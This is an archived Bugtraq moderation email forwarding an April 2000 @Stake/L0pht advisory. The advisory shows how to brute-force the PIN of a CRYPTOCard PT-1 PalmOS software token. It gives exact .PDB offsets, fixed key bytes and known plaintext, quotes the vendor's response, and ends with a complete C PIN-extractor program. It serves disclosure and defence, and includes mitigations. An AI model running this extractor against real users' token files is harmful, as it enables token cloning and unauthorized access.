From aleph1@SECURITYFOCUS.COM Mon Apr 10 15:51:07 2000
Date: Mon, 10 Apr 2000 12:09:00 -0700
From: Elias Levy <aleph1@SECURITYFOCUS.COM>
To: vuldb@securityfocus.com
Subject: (forw) BUGTRAQ: approval required (766199DC)


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/

    [ Part 2: "Included Message" ]

Date: Mon, 10 Apr 2000 08:35:53 -0700
From: "L-Soft list server at LISTS.SECURITYFOCUS.COM (1.8d)"
    <LISTSERV@LISTS.SECURITYFOCUS.COM>
To: Elias Levy <aleph1@SECURITYFOCUS.COM>
Subject: BUGTRAQ: approval required (766199DC)

This message  was originally submitted  by kingpin@ATSTAKE.COM to  the BUGTRAQ
list at LISTS.SECURITYFOCUS.COM. You can  approve it using the "OK" mechanism,
ignore it, or repost an edited copy. The message will expire automatically and
you do not need to do anything if you just want to discard it. Please refer to
the list owner's guide if you are  not familiar with the "OK" mechanism; these
instructions  are  being  kept  purposefully short  for  your  convenience  in
processing large numbers of messages.

----------------- Original message (ID=766199DC) (315 lines) ------------------
Return-Path: <owner-bugtraq@securityfocus.com>
Delivered-To: bugtraq@lists.securityfocus.com
Received: from securityfocus.com (dev.securityfocus.com [207.126.127.78])
	by lists.securityfocus.com (Postfix) with SMTP id AEF771EF07
	for <bugtraq@lists.securityfocus.com>; Mon, 10 Apr 2000 08:35:52 -0700 (PDT)
Received: (qmail 4385 invoked by alias); 10 Apr 2000 15:35:23 -0000
Delivered-To: bugtraq@securityfocus.com
Received: (qmail 4382 invoked from network); 10 Apr 2000 15:35:23 -0000
Received: from 216.230.73.3.cypresscom.net (HELO porfidio.atstake.com) (216.230.73.3)
  by dev.securityfocus.com with SMTP; 10 Apr 2000 15:35:23 -0000
Received: (qmail 31737 invoked from network); 10 Apr 2000 14:36:23 -0000
Received: from unknown (HELO boddington.atstake.com) (172.16.1.2)
  by softdnserror with SMTP; 10 Apr 2000 14:36:23 -0000
Received: by atstake.com with Internet Mail Service (5.5.2650.21)
	id <2HRYPV35>; Mon, 10 Apr 2000 11:38:26 -0400
Message-ID: <C5119AD12E92D311928E009027DE4CCA07DAA6@atstake.com>
From: Kingpin <kingpin@atstake.com>
To: "'bugtraq@securityfocus.com'" <bugtraq@securityfocus.com>
Subject: CRYPTOAdmin 4.1 server with PalmPilot PT-1 token 1.04 PIN Extract
	ion
Date: Mon, 10 Apr 2000 11:38:19 -0400
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain;
	charset="iso-8859-1"


                              @Stake Inc.
                          L0pht Research Labs
                    www.atstake.com     www.L0pht.com


                           Security Advisory       

       
   Advisory Name: CRYPTOCard PalmToken PIN Extraction
    Release Date: April 10, 2000
     Application: CRYPTOAdmin 4.1 server with CRYPTOCard PT-1 token 1.04
        Platform: Server software on any environment and token
                  software on Palm Computing Platform device, 
                  any hardware, any OS
        Severity: An attacker can determine the private PIN number
                  of a users token within a matter of minutes and 
                  clone the challenge/response scheme of the 
                  legitimate user.
          Author: Kingpin [kingpin@atstake.com]
                  Dildog [dildog@atstake.com]
   Vendor Status: Vendor contacted - response and precautions are 
                  shown below
             Web: http://www.L0pht.com/advisories.html
                     

Overview:

        CRYPTOCard's (http://www.cryptocard.com) CRYPTOAdmin software is a
user authentication administration system which uses various hardware and
software token devices for challenge/response. Using the user's PIN number
("what you know") and the token ("what you have"), the correct response
will be calculated based on the challenge prompted from the CRYPTOAdmin
server.

        The PT-1 token, which runs on a PalmOS device, generates the 
one-time-password response. A PalmOS .PDB file is created by the
CRYPTOAdmin software for each user. The .PDB file is loaded onto the Palm
device. The user name, serial number, key, and PIN number are all stored 
in this file in either encrypted or plaintext form. By gaining access to 
the .PDB file, the legitimate user's PIN can be determined through a 
series of DES decrypts-and-compares.

        Having both the .PDB and the PIN number will allow an attacker to 
clone the token on another Palm device and generate the proper responses 
given the challenge from the CRYPTOAdmin server. Using the demonstration
tool below, the PIN can be determined in under 5 minutes on a Pentium 
III 450MHz.


Detailed Description:

        The PalmOS PT-1 application requires the user to enter their PIN
number before the challenge/response information is granted. If the 
.PDB file of the legitimate users gets into the hands of an attacker, 
they will easily be able to extract the legitimate PIN using the 
demonstration tool below.

        The PalmOS platform is inherently insecure and was not designed 
for security-related applications. Any application and database 
information can be accessed and modified by any other application. In 
the past, tokens used to generate one-time-passwords were often 
tamper-evident hardware devices. These devices are difficult to 
reverse-engineer and will sometimes erase critical information if
tampering is detected. The software token, such as the PT-1 Palm token, 
allows the functionality of a previously secure device to be executed 
on an insecure platform. Methods to determine program operation is much 
easier in this fashion, making the software tokens less secure and 
causing a weak link in the security chain.

        The .PDB file, containing the critical information, can be accessed 
from either the user's desktop PC or Palm device. PalmOS HotSync often 
stores a copy of the application, once sync'ed to the Palm, in the 
/Palm/<user>/Backup directory. If a new .PDB file is pending for sync to 
the Palm, it is stored in the /Palm/<user>/Install directory. 

        If an attacker has temporary access to the user's Palm, they can 
transfer the .PDB file to their own Palm device using the PalmOS "Beam" 
functionality. CRYPTOCard intentionally prevents the beaming of their 
database by setting the PalmOS lock bit, but using BeamCrack, a L0pht 
Heavy Industries tool, the lock bit can be removed and the database 
can be beamed. 

        The information we need from the .PDB, which is an 8-byte 
ciphertext string, is located from address $BD to $C4. Simply open the 
.PDB file in a hex editor to extract the bytes. 

        The DES key is generated based on the entered PIN number and a 
fixed 4-byte value, $247E 3E6C. If the administrator issues PINs with 
less than 8 digits, the PIN is padded up to 8 digits with 45678 (i.e. 
if PIN is 9999, it will be padded to be 99995678) before the DES key is 
generated. 

        If the entered PIN is correct, the DES decrypt will output a 
plaintext of $636A 2A3F 256D 676C. If the entered PIN is incorrect, 
the plaintext output will be different, since the key used to decrypt 
the information was incorrect.

        ciphertext from .PDB -> DES Decrypt -> plaintext known
                                            ^
                                            |
                        key = (entered PIN) w/ fixed value

        An example PIN authentication routine is as follows:

        1) Ciphertext from .PDB = $11FB 32C3 80EE 9318
        2) Entered PIN number * 9 = 26745678 * 9 = $0E58 F5BE
        3) Key = $0E58 F5BE 247E 3E6C
        4) DES decrypt -> plaintext = $636A 2A3F 256D 676C
        5) If plaintext = $636A 2A3F 256D 676C, PIN is good!

        By creating a key based on each possible 8-digit PIN, ranging 
from 00000000 to 99999999, and performing decrypt-and-compare, the 
PIN can be brute-forced in a trivial amount of time. On a Pentium III
450MHz running Windows NT 4.0, the 100,000,000 PIN attempts can be 
completed in under 5 minutes.


Temporary Solution:

        The quick solution, although it does not remedy the core problem, 
is to confirm that the .PDB file is not stored on the user's desktop 
machine after it has been loaded onto the PalmOS device. A global find 
for *.PDB will enable you to find all .PDB files on the user's machine. 
It is highly recommended that extreme caution is taken to prevent 
compromise of the .PDB files. 

        Changing the PIN numbers on a daily or weekly basis is also 
recommended. 

        A longer term solution, especially if the PT-1 tokens are already 
deployed, would be to move to a tamper-evident hardware token, such as 
the CRYPTOCard RB-1 or KF-1 devices. These physical pieces of hardware 
are much more secure, due to the fact that they are dedicated to one 
function and it is more difficult to extract the PIN information from 
the devices. 


Vendor Response:

        CRYPTOCard Corporation and Tony Walker, VP of Development, were 
extremely responsive to our advisory submission. Their friendliness,
quick response, and action plan is greatly appreciated and should be
commended. What follows is the exact response to our submission.

> Thanks for your message.  I guess there are several points to be
> addressed.
>
> First, we are in complete agreement that any software based 
> security is inherently breakable if you can get at the originating 
> system.  Your attack on our Palm Pilot token exploits this weakness.  
> As you point out, the Palm Pilot platform is inherently insecure, as 
> is any platform that permits third parties to write programs for it.
>
> However, there is a strong market demand for this type of device.  We 
> do point out to our customers that these tokens are inherently weaker 
> than the hardware tokens but many customers choose to use them anyway 
> because of the convenience they offer.
>
> As you are well aware, all security is a matter of cost -- the cost 
> of breaking it versus the value of the material obtained.  It is up 
> to the individual customer to evaluate the trade-offs and make this 
> choice.
>
> If using such a token, there are several precautions that a customer
> should take:
>
> 1.  Ensure that the PDB files are distributed securely. In 
> particular: if your email system is not secure use another 
> distribution method.
>
> 2.  Once the PDB has been loaded into your Palm Pilot, don't leave 
> the file around on your PC.
>
> 3.  Most importantly, be very careful about the physical security of
> your Palm Pilot. Don't leave it where someone else might access it.  
> Once an attacker has access to your Palm Pilot, perhaps only for a 
> few minutes, the security of your token is compromised.
>
> The point about physical security cannot be overemphasized.  Any
> security device must be physically secure at all times.  In the case 
> of a device such as a Palm Pilot, this means that the owner should 
> not leave it unattended or loan it to a colleague.  When the owner 
> is not carrying it with him or her, it should be stored in a safe 
> place.
>
> Having said all that, there are always ways to improve.  The next
> release of the Palm Pilot token software will not store the PDB file 
> in the Palm Pilot's database, and will use alphanumeric PINs to make 
> a brute force attack more difficult.  This will make the token 
> somewhat more difficult to extract but, of course, still not proof 
> against a determined attacker.
>
> We are also looking at ways to make the software tokens themselves 
> more secure.  However this is an inherently more difficult problem 
> as we must assume that anything a software program can do is visible 
> to an attacker.
>
> Regards,
>
> Tony


Proof-of-Concept Code:
         
        The demonstration tool, in form of an application, has been 
written for both Unix and Windows PC platforms. Source code for Unix, 
which uses Eric Young's libdes library, is below. The PC version can 
be found at http://www.L0pht.com/~kingpin

<--- cut here --->

#include<stdio.h>
#include<des.h>

int main(int argc, char **argv)
{
        des_cblock in,out,key,valid = {0x63, 0x6A, 0x2A, 0x3F, 
                                     0x25, 0x6D, 0x67, 0x6C};
        des_key_schedule sched;
        unsigned long massaged;
        FILE *pdb;
                 
        if (argc == 1)
        {
                fprintf(stdout, "\nUsage: %s <.PDB filename>\n\n", argv[0]);
        return 1;
        }       

        fprintf(stdout, "\nCRYPTOCard PT-1 PIN Extractor\n");
        fprintf(stdout, "kingpin@atstake.com\n");
        fprintf(stdout, "@Stake L0pht Research Labs\n");
        fprintf(stdout, "http://www.atstake.com\n\n");
        
        if((pdb = fopen(argv[1], "rb")) == NULL)
        {
                fprintf(stderr, "Missing input file %s.\n\n", argv[1]);
                return 1;
        }
        
        fseek(pdb, 189L, SEEK_SET);
        if (fread(in, 1, 8, pdb) != 8)
        {
                fprintf(stderr, "Error getting ciphertext string.\n\n");
                return 1;
        }
        
        fclose(pdb);
                
        key[4] = 0x24;
        key[5] = 0x7E;
        key[6] = 0x3E;
        key[7] = 0x6C;

        for (massaged = 0; massaged < 900000000; massaged += 9)
        {
                key[0]=(massaged>>24) & 0xff;
                key[1]=(massaged>>16) & 0xff;
                key[2]=(massaged>>8) & 0xff;
                key[3]=(massaged) & 0xff;

                des_set_key(&key,sched);
                des_ecb_encrypt(&in,&out,sched,DES_DECRYPT);
        
                if (memcmp(out, valid, 8) == 0)
                {
                        fprintf(stdout, "\n\nPIN: %d", massaged/9);
                break;
                }

                if ((massaged % 900000) == 0)
                {
                fprintf(stdout, "#");
                fflush(stdout);
                }
        }

        fprintf(stdout, "\n\n");
        return 0;
}

<--- cut here --->


kingpin@atstake.com 

  [ For more advisories check out http://www.l0pht.com/advisories.html ]
                                         L-ZERO-P-H-T
